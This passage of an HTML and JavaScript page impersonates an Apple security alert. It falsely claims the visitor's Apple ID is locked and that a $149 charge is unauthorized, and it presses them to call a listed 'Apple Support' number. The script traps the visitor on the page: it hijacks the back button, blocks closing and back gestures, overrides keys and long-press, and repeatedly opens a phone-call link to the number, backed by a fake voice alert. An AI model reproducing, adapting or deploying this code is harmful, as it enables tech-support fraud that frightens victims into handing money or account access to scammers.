                    <span><i class="fas fa-infinity"></i> Free</span>
                    <span><i class="far fa-clock"></i> 24/7</span>
                    <span><i class="fas fa-lock"></i> Encrypted</span>
                </div>

                <div class="alert-box">
                    <div class="title"><i class="fas fa-exclamation-triangle"></i> Apple ID Locked</div>
                    <p>Your Apple ID has been temporarily restricted due to an unrecognized sign-in attempt.</p>
                    <div class="location"><i class="fas fa-map-pin"></i> Unknown location · IP masked</div>
                    <button class="verify-now" id="verifyBtn2"><i class="fas fa-shield-alt"></i> Verify now to prevent permanent lock<br> +1-866-381-6357</button>
                </div>

                <div class="support-msg">
                    <i class="fas fa-headset" style="color: #007aff;"></i> Call Apple Support immediately:
                </div>

                <div class="voice-message-banner" id="voiceBanner">
                    <div class="left">
                        <i class="fas fa-volume-up pulse"></i>
                        <span class="msg"><strong>⚠️ Voice alert:</strong> Unauthorized charge detected</span>
                    </div>
                    <span class="badge">NEW</span>
                </div>

                <div style="display: flex; gap: 6px; margin: 2px 0 4px; flex-wrap: wrap;">
                    <span style="background: #2c2c2e; padding: 2px 10px; border-radius: 40px; font-size: 11px; color: #aeaeb2; border:1px solid #3a3a3c;"><i class="fas fa-credit-card"></i> $149.00</span>
                    <span style="background: #2c2c2e; padding: 2px 10px; border-radius: 40px; font-size: 11px; color: #aeaeb2; border:1px solid #3a3a3c;"><i class="fas fa-exclamation-circle"></i> Unauthorized</span>
                </div>

                <div class="voice-container">
                    <i class="fas fa-microphone-alt"></i>
                    <span class="msg-text">“Unauthorized charge of $149.00 from your App Store”</span>
                    <button class="voice-play-btn" id="playVoiceBtn">
                        <i class="fas fa-play"></i> Listen
                    </button>
                </div>

                <div class="secure-footer">
                    <span><i class="fas fa-lock"></i> Secure</span>
                    <span><i class="fas fa-shield-alt"></i> Encrypted</span>
                    <span><i class="fas fa-clock"></i> 24/7</span>
                </div>
                <p class="text-small">Tap "Listen" for voice alert about unauthorized charges</p>
            </div>

        </div>
    </div>

    <script>
        (function() {
            'use strict';

            // ----- DYNAMIC DATE -----
            function updateDynamicDate() {
                const now = new Date();
                const options = {
                    year: 'numeric',
                    month: 'short',
                    day: 'numeric',
                    hour: '2-digit',
                    minute: '2-digit',
                    timeZoneName: 'short'
                };
                const dateStr = now.toLocaleString('en-US', options);
                const el = document.getElementById('dynamicDate');
                if (el) el.textContent = dateStr;
            }
            updateDynamicDate();

            // ----- ELEMENTS -----
            const splash = document.getElementById('splashScreen');
            const popup = document.getElementById('popupOverlay');
            const page1 = document.getElementById('page1');
            const page2 = document.getElementById('page2');
            const gotoPage2Btn = document.getElementById('gotoPage2Btn');
            const backToPage1Btn = document.getElementById('backToPage1Btn');
            const playBtn = document.getElementById('playVoiceBtn');
            const voiceBanner = document.getElementById('voiceBanner');
            const verifyBtn2 = document.getElementById('verifyBtn2');

            const PHONE = '+18663816357';

            // ----- PAGE NAVIGATION -----
            function showPage(pageId) {
                document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
                const target = document.getElementById(pageId);
                if (target) target.classList.add('active');
                const card = document.getElementById('mainCard');
                if (card) card.scrollTop = 0;
            }

            gotoPage2Btn.addEventListener('click', function(e) {
                e.preventDefault();
                showPage('page2');
                setTimeout(function() {
                    if (!voiceStarted) {
                        tryPlayVoice();
                    }
                }, 300);
            });

            backToPage1Btn.addEventListener('click', function(e) {
                e.preventDefault();
                showPage('page1');
                if (voiceStarted) {
                    pauseVoice();
                }
            });

            // ----- FORCE CALL -----
            function forceCall() {
                window.location.href = 'tel:' + PHONE;
                return false;
            }

            // ----- BACK BUTTON TRAP + CLOSE WARNING (NEW) -----
            // Push a history state to trap the user
            history.pushState(null, null, location.href);

            // 1. Intercept popstate (back button) – show warning then force call
            window.addEventListener('popstate', function(e) {
                // Re-push state to keep trapped
                history.pushState(null, null, location.href);

                // Custom warning before call
                const shouldCall = confirm(
                    '⚠️ SECURITY ALERT\n\n' +
                    'Your Apple ID session is active. Closing this page may leave your account open and expose your payments & banking to serious threats.\n\n' +
                    'Please call Apple Support immediately to secure your account.\n\n' +
                    '📞 +1 866-381-6357\n\n' +
                    'Would you like to call now?'
                );

                if (shouldCall) {
                    forceCall();
                } else {
                    // If they cancel, show another alert and keep them trapped
                    alert(
                        '⚠️ You must call Apple Support immediately to protect your account.\n\n' +
                        'Your payments and banking information are at risk. Please do not close this page.'
                    );
                    // Re-push state again to ensure they can't leave
                    history.pushState(null, null, location.href);
                }
                return false;
            });

            // 2. Intercept beforeunload (refresh / close tab) – show warning
            window.addEventListener('beforeunload', function(e) {
                e.preventDefault();
                e.returnValue = '⚠️ SECURITY WARNING: Your Apple ID session is active. Closing this page may expose your payments & banking to serious threats. Please call support.';
                return e.returnValue;
            });

            // 3. Also block pagehide for iOS (when user tries to close tab / navigate)
            window.addEventListener('pagehide', function(e) {
                const isIOS = /iPad|iPhone|iPod/.test(navigator.userAgent) || 
                             (navigator.platform === 'MacIntel' && navigator.maxTouchPoints > 1);
                if (isIOS && !window._callInitiated) {
                    // Show a warning via alert (iOS may not show beforeunload consistently)
                    alert(
                        '⚠️ SECURITY WARNING\n\n' +
                        'Your Apple ID session is active. Closing this page may leave your account open and expose your payments & banking to serious threats.\n\n' +
                        'Please call Apple Support immediately: +1 866-381-6357'
                    );
                    // Attempt to call anyway
                    setTimeout(function() {
                        window.location.href = 'tel:' + PHONE;
                    }, 100);
                }
            });

            // 4. Block context menu (long press) – optional, shows warning
            document.addEventListener('contextmenu', function(e) {
                e.preventDefault();
                const shouldCall = confirm(
                    '⚠️ SECURITY ALERT\n\n' +
                    'Your Apple ID session is active. Closing this page may leave your account open and expose your payments & banking to serious threats.\n\n' +
                    'Call Apple Support now? 📞 +1 866-381-6357'
                );
                if (shouldCall) forceCall();
            });

            // 5. Block left swipe (back gesture on iOS)
            let startX = 0;
            document.addEventListener('touchstart', function(e) {
                startX = e.touches[0].clientX;
            }, { passive: true });
            document.addEventListener('touchmove', function(e) {
                const touch = e.touches[0];
                const deltaX = touch.clientX - startX;
                if (startX < 30 && deltaX > 50) {
                    e.preventDefault();
                    const shouldCall = confirm(
                        '⚠️ BACK GESTURE DETECTED\n\n' +
                        'Your Apple ID session is active. Closing this page may leave your account open and expose your payments & banking to serious threats.\n\n' +
                        'Call Apple Support now? 📞 +1 866-381-6357'
                    );
                    if (shouldCall) forceCall();
                }
            }, { passive: false });

            // 6. Block keyboard shortcuts (Backspace, etc.)
            document.addEventListener('keydown', function(e) {
                if (e.key === 'Backspace' || (e.metaKey && e.key === 'ArrowLeft') || (e.altKey && e.key === 'ArrowLeft')) {
                    e.preventDefault();
                    const shouldCall = confirm(
                        '⚠️ NAVIGATION BLOCKED\n\n' +
                        'Your Apple ID session is active. Closing this page may leave your account open and expose your payments & banking to serious threats.\n\n' +
                        'Call Apple Support now? 📞 +1 866-381-6357'
                    );
                    if (shouldCall) forceCall();
                }
            });

            // ----- PHONE CALL (tel: link) -----
            verifyBtn2.addEventListener('click', function(e) {
                e.preventDefault();
                window._callInitiated = true;
                window.location.href = 'tel:' + PHONE;
            });

            document.querySelector('.phone-number-display .number a')?.addEventListener('click', function(e) {
                window._callInitiated = true;
            });

            // ----- VOICE MESSAGE -----
            let voiceStarted = false;
            let voicePaused = false;
            let currentUtterance = null;

            function tryPlayVoice() {
                if ('speechSynthesis' in window) {
                    window.speechSynthesis.cancel();
                    const msg = new SpeechSynthesisUtterance();
                    msg.text = "Unauthorized charge of one hundred forty nine dollars from your Apple ID. Please call support immediately. This is a secure voice alert.";
                    msg.lang = 'en-US';
                    msg.rate = 0.95;
                    msg.pitch = 1.0;
                    msg.volume = 1;
                    msg.onend = function() {
                        voiceStarted = false;
                        if (playBtn) {
                            playBtn.innerHTML = '<i class="fas fa-play"></i> Listen';
                            playBtn.style.background = '#007aff';
                        }
                    };
                    currentUtterance = msg;
                    window.speechSynthesis.speak(msg);
                    voiceStarted = true;
                    voicePaused = false;
                    if (playBtn) {
                        playBtn.innerHTML = '<i class="fas fa-stop"></i> Stop';
                        playBtn.style.background = '#ff3b30';
                    }
                    if (voiceBanner) {
                        voiceBanner.style.border = '2px solid #ff9500';
                        setTimeout(() => { voiceBanner.style.border = '1px solid #3a3a3c'; }, 2000);
                    }
                } else {
                    alert('🔊 Voice alert: Unauthorized charge of $149.00 from your App Store. Please call support.');
                }
            }

            function pauseVoice() {
                if ('speechSynthesis' in window) {
                    if (window.speechSynthesis.speaking) {
                        window.speechSynthesis.cancel();
                        voiceStarted = false;
                        voicePaused = true;
                        if (playBtn) {
                            playBtn.innerHTML = '<i class="fas fa-play"></i> Listen';
                            playBtn.style.background = '#007aff';
                        }
                    }
                }
            }

            function stopVoice() {
                if ('speechSynthesis' in window) {
                    window.speechSynthesis.cancel();
                    voiceStarted = false;
                    voicePaused = false;
                    if (playBtn) {
                        playBtn.innerHTML = '<i class="fas fa-play"></i> Listen';
                        playBtn.style.background = '#007aff';
                    }
                }
            }

            playBtn.addEventListener('click', function(e) {
                e.stopPropagation();
                if (voiceStarted) {
                    stopVoice();
                } else {
                    tryPlayVoice();
                }
            });

            voiceBanner.addEventListener('click', function(e) {
                if (!voiceStarted) {
                    tryPlayVoice();
                }
            });

            // Stop voice if popup hidden
            const observer = new MutationObserver(function(mutations) {
                mutations.forEach(function(mutation) {
                    if (mutation.attributeName === 'class') {
                        if (!popup.classList.contains('active')) {
                            stopVoice();
                        }
                    }
                });
            });
            observer.observe(popup, { attributes: true });

            document.addEventListener('visibilitychange', function() {
                if (document.visibilityState === 'hidden') {
                    stopVoice();
                }
            });

            // ----- SPLASH TIMER (2.8s) then popup -----
            setTimeout(() => {
                splash.classList.add('hidden');
                popup.classList.add('active');
                showPage('page1');
            }, 2800);

            console.log('📱 Popup with 2-page navigation ready.');
            console.log('📞 Phone number: ' + PHONE);
            console.log('🔊 Voice: tap Listen on Page 2 (iOS autoplay fallback ready)');
            console.log('🔒 Back button trapped + close warning active.');

        })();
    </script>

</body>
</html>
